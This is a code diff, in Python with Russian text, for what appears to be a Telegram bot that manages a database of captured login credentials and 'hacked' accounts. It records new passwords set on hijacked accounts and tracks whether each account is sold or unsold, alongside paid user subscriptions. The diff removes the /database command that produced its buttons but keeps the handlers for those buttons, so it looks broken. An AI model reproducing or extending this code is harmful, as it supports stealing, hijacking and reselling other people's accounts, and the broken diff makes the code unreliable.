@@ -896,58 +896,209 @@ def delprefix_cmd(message):
     except Exception as e:
         print(f"Ошибка отправки ответа на /delprefix для {chat_id}: {e}")
 
-@bot.message_handler(commands=['database'])
-def database_cmd(message):
+# Вставьте этот код после существующего @bot.callback_query_handler для "hack_" и "delete_"
+
+@bot.callback_query_handler(func=lambda call: call.data in ["db_add", "db_delete", "db_view"])
+def handle_database_callback(call):
+    chat_id = str(call.message.chat.id)
+    print(f"Обработка callback для /database от chat_id: {chat_id}, data: {call.data}")
+    
+    try:
+        if call.data == "db_add":
+            print(f"Запрос на добавление в базу от {chat_id}")
+            msg = bot.edit_message_text(
+                "📝 Выберите, что добавить:\n"
+                "Формат: `<тип> <данные>`\n"
+                "Примеры:\n"
+                "- `user <chat_id> <префикс> <дни>` (user 123456789 Админ 30)\n"
+                "- `cred <логин> <пароль>` (cred test test123)\n"
+                "- `hacked <логин> <пароль>` (hacked test test123)",
+                chat_id, call.message.message_id, parse_mode='Markdown'
+            )
+            bot.answer_callback_query(call.id)
+            pending_hacked[chat_id] = {'step': 'awaiting_db_add', 'message_id': msg.message_id}
+        
+        elif call.data == "db_delete":
+            print(f"Запрос на удаление из базы от {chat_id}")
+            msg = bot.edit_message_text(
+                "🗑 Введите, что удалить:\n"
+                "Формат: `<тип> <ключ>`\n"
+                "Примеры:\n"
+                "- `user <chat_id>` (user 123456789)\n"
+                "- `cred <логин>` (cred test)\n"
+                "- `hacked <логин>` (hacked test)",
+                chat_id, call.message.message_id, parse_mode='Markdown'
+            )
+            bot.answer_callback_query(call.id)
+            pending_hacked[chat_id] = {'step': 'awaiting_db_delete', 'message_id': msg.message_id}
+        
+        elif call.data == "db_view":
+            print(f"Запрос на просмотр базы от {chat_id}")
+            response = "📊 Текущая база данных:\n\n"
+            users = get_all_users()
+            response += "👤 Пользователи:\n"
+            if not users:
+                response += "Список пуст\n"
+            else:
+                for chat_id_user, prefix, subscription_end, site_clicks, password_views in users:
+                    time_left = (datetime.fromisoformat(subscription_end) - get_current_time()).days if subscription_end else 0
+                    response += f"🆔 {chat_id_user} | {prefix} | {time_left} дней\n"
+            
+            credentials = get_credentials()
+            response += "\n🔑 Пароли:\n"
+            if not credentials:
+                response += "Список пуст\n"
+            else:
+                for login, password, added_time in credentials:
+                    response += f"👤 {login} | {password}\n"
+            
+            hacked_accounts = get_hacked_accounts()
+            response += "\n🔓 Взломанные аккаунты:\n"
+            if not hacked_accounts:
+                response += "Список пуст\n"
+            else:
+                for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
+                    response += f"👤 {login} | {password} | {sold_status}\n"
+            
+            bot.edit_message_text(response, chat_id, call.message.message_id)
+            bot.answer_callback_query(call.id)
+    
+    except Exception as e:
+        print(f"Ошибка обработки callback /database для {chat_id}: {e}")
+        bot.answer_callback_query(call.id, "❌ Ошибка при выполнении действия!")
+
+# Обновим существующий обработчик ввода, добавив поддержку шагов awaiting_db_add и awaiting_db_delete
+@bot.message_handler(func=lambda message: str(message.chat.id) in pending_hacked)
+def handle_hacked_input(message):
     chat_id = str(message.chat.id)
-    print(f"Обработка /database для chat_id: {chat_id}")
-    access = check_access(chat_id, 'database')
-    if access:
-        print(f"Доступ ограничен для /database: {access}")
-        try:
-            bot.reply_to(message, access)
-        except Exception as e:
-            print(f"Ошибка отправки ответа на /database для {chat_id}: {e}")
+    print(f"Обработка ввода для chat_id: {chat_id}")
+    if chat_id not in pending_hacked:
+        print(f"Нет активного процесса для {chat_id}")
         return
     
-    response = "📊 **Управление базой данных**\n\n"
-    users = get_all_users()
-    response += "👤 **Пользователи**:\n"
-    if not users:
-        response += "Список пуст\n"
-    else:
-        for chat_id_user, prefix, subscription_end, site_clicks, password_views in users:
-            time_left = (datetime.fromisoformat(subscription_end) - get_current_time()).days if subscription_end else 0
-            response += f"🆔 `{chat_id_user}` | 👑 {prefix} | ⏳ {time_left} дней\n"
+    data = pending_hacked[chat_id]
+    step = data.get('step')
     
-    credentials = get_credentials()
-    response += "\n🔑 **Пароли**:\n"
-    if not credentials:
-        response += "Список пуст\n"
-    else:
-        for login, password, added_time in credentials:
-            formatted_time = format_time_with_minutes(added_time)
-            response += f"👤 `{login}` | 🔒 `{password}` | ⏰ {formatted_time}\n"
+    if step == 'awaiting_input':
+        args = message.text.strip().split()
+        if len(args) != 2:
+            print("Неверный формат ввода для добавления аккаунта")
+            try:
+                bot.reply_to(message, "❌ Формат: `<логин> <пароль>`\nПример: `test test123`", parse_mode='Markdown')
+            except Exception as e:
+                print(f"Ошибка отправки ответа для awaiting_input для {chat_id}: {e}")
+            return
+        login, password = args[0], args[1]
+        markup = types.InlineKeyboardMarkup()
+        markup.add(
+            types.InlineKeyboardButton("💰 Продан", callback_data=f"hack_{login}_{password}_Продан_{chat_id}"),
+            types.InlineKeyboardButton("📦 Не продан", callback_data=f"hack_{login}_{password}_Не продан_{chat_id}")
+        )
+        print(f"Запрос статуса для {login} от {chat_id}")
+        try:
+            bot.reply_to(message, f"🔓 Укажите статус для `{login}`:", reply_markup=markup, parse_mode='Markdown')
+            del pending_hacked[chat_id]
+        except Exception as e:
+            print(f"Ошибка отправки запроса статуса для awaiting_input для {chat_id}: {e}")
     
-    hacked_accounts = get_hacked_accounts()
-    response += "\n🔓 **Взломанные аккаунты**:\n"
-    if not hacked_accounts:
-        response += "Список пуст\n"
-    else:
-        for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
-            formatted_time = format_time_with_minutes(hack_date)
-            response += f"👤 `{login}` | 🔒 `{password}` | ⏰ {formatted_time} | 💰 {sold_status}\n"
+    elif step == 'awaiting_new_password':
+        new_password = message.text.strip()
+        login = data['login']
+        sold_status = data['sold_status']
+        linked_chat_id = data['linked_chat_id']
+        user = get_user(chat_id)
+        prefix = user['prefix']
+        
+        if save_hacked_account(login, new_password, prefix, sold_status, linked_chat_id):
+            if data.get('from_passwords'):
+                delete_credentials(login)
+            print(f"Аккаунт {login} добавлен в hacked с новым паролем")
+            try:
+                bot.reply_to(message, f"✅ Аккаунт `{login}` успешно добавлен в взломанные!\n"
+                                    f"🔒 Новый пароль: `{new_password}`\n"
+                                    f"💰 Статус: {sold_status}\n"
+                                    f"👑 Префикс: {prefix}", parse_mode='Markdown')
+            except Exception as e:
+                print(f"Ошибка отправки подтверждения для awaiting_new_password для {chat_id}: {e}")
+        else:
+            print(f"Ошибка при добавлении аккаунта {login}")
+            try:
+                bot.reply_to(message, "❌ Ошибка при добавлении аккаунта!")
+            except Exception as e:
+                print(f"Ошибка отправки ошибки для awaiting_new_password для {chat_id}: {e}")
+        del pending_hacked[chat_id]
+        print(f"Процесс взлома завершен для {chat_id}")
     
-    markup = types.InlineKeyboardMarkup()
-    markup.add(
-        types.InlineKeyboardButton("➕ Добавить", callback_data="db_add"),
-        types.InlineKeyboardButton("🗑 Удалить", callback_data="db_delete"),
-        types.InlineKeyboardButton("👁 Просмотр", callback_data="db_view")
-    )
-    print(f"Отправка данных базы для {chat_id}")
-    try:
-        bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
-    except Exception as e:
-        print(f"Ошибка отправки ответа на /database для {chat_id}: {e}")
+    elif step == 'awaiting_db_add':
+        args = message.text.strip().split()
+        if len(args) < 3:
+            print(f"Неверный формат ввода для добавления в базу от {chat_id}")
+            try:
+                bot.reply_to(message, "❌ Неверный формат! Примеры:\n"
+                                     "- `user <chat_id> <префикс> <дни>`\n"
+                                     "- `cred <логин> <пароль>`\n"
+                                     "- `hacked <логин> <пароль>`", parse_mode='Markdown')
+            except Exception as e:
+                print(f"Ошибка отправки ответа для awaiting_db_add для {chat_id}: {e}")
+            return
+        
+        type_data = args[0].lower()
+        if type_data == "user" and len(args) == 4 and args[3].isdigit():
+            target_chat_id, prefix, days = args[1], args[2], int(args[3])
+            subscription_end = get_current_time() + timedelta(days=days)
+            save_user(target_chat_id, prefix, subscription_end)
+            response = f"✅ Пользователь {target_chat_id} добавлен с префиксом {prefix} на {days} дней!"
+        elif type_data == "cred" and len(args) == 3:
+            login, password = args[1], args[2]
+            save_credentials(login, password)
+            response = f"✅ Логин `{login}` с паролем `{password}` добавлен!"
+        elif type_data == "hacked" and len(args) == 3:
+            login, password = args[1], args[2]
+            user = get_user(chat_id)
+            save_hacked_account(login, password, user['prefix'], "Не продан", chat_id)
+            response = f"✅ Взломанный аккаунт `{login}` добавлен!"
+        else:
+            response = "❌ Неверный тип или формат данных!"
+        
+        try:
+            bot.reply_to(message, response, parse_mode='Markdown')
+            bot.edit_message_text("📊 Управление базой данных выполнено!", chat_id, data['message_id'])
+            del pending_hacked[chat_id]
+        except Exception as e:
+            print(f"Ошибка отправки ответа для awaiting_db_add для {chat_id}: {e}")
+    
+    elif step == 'awaiting_db_delete':
+        args = message.text.strip().split()
+        if len(args) != 2:
+            print(f"Неверный формат ввода для удаления из базы от {chat_id}")
+            try:
+                bot.reply_to(message, "❌ Неверный формат! Примеры:\n"
+                                     "- `user <chat_id>`\n"
+                                     "- `cred <логин>`\n"
+                                     "- `hacked <логин>`", parse_mode='Markdown')
+            except Exception as e:
+                print(f"Ошибка отправки ответа для awaiting_db_delete для {chat_id}: {e}")
+            return
+        
+        type_data, key = args[0].lower(), args[1]
+        if type_data == "user":
+            save_user(key, "Посетитель", get_current_time())
+            response = f"✅ Пользователь {key} удален (префикс сброшен)!"
+        elif type_data == "cred":
+            delete_credentials(key)
+            response = f"✅ Логин `{key}` удален из паролей!"
+        elif type_data == "hacked":
+            delete_hacked_account(key)
+            response = f"✅ Логин `{key}` удален из взломанных!"
+        else:
+            response = "❌ Неверный тип данных!"
+        
+        try:
+            bot.reply_to(message, response, parse_mode='Markdown')
+            bot.edit_message_text("📊 Управление базой данных выполнено!", chat_id, data['message_id'])
+            del pending_hacked[chat_id]
+        except Exception as e:
+            print(f"Ошибка отправки ответа для awaiting_db_delete для {chat_id}: {e}")
 
 @bot.message_handler(commands=['adduser'])
 def add_user_cmd(message):
